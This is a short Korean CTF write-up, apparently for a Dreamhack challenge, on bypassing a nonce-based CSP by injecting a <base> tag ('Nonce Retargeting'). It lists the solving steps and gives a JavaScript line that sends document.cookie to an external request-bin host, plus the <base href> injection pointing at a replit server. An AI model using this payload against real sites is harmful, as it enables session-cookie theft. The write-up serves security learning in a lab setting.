만약 페이지에 임의 마크업을 삽입할 수 있는 취약점이 있지만, nonce CSP 구문으로 인해 스크립트를 삽입할 수 없다고 
가정합니다. 이 때, base-uri CSP 구문을 지정하지 않은 경우 Figure8과 같이 base 태그를 이용하여 임의 자원을 로드할 
수 있습니다. 이와 같은 형태의 공격을 Nonce Retargeting 이라고 부릅니다.


replit으로 html, js 서버를 열어준다 
static/js/jquery.min.js 로 경로를 만들어준다음 
index.html에 <script src="static/js/jquery.min.js"></script> 이 내용을 추가하여 js를 연동시킨다. 
js에 location.href = "https://cggprwk.request.dreamhack.games/?memo=" + document.cookie; 이것만 쓴다. 
alert이나 a onmouseover등은 필요 없다. 그냥 이 내용만 써도 자바스크립트가 충분히 작동한다. 
그리고 해당 웹 url을 <base href="https://LateCanineRecursion.ylogic.repl.co"> 이렇게 추가한 다음 
flag에서 Submit으로 보낸다. vuln에는 해당 쿠키가 없기 때문에 자바스크립트를 주입하여 실행시킬 수는 있지만 
해당 플래그 쿠키를 가져올 수는 없다. 관리자만 가지고 있으므로 submit을 통해 report를 해주는 것이 중요하다. 
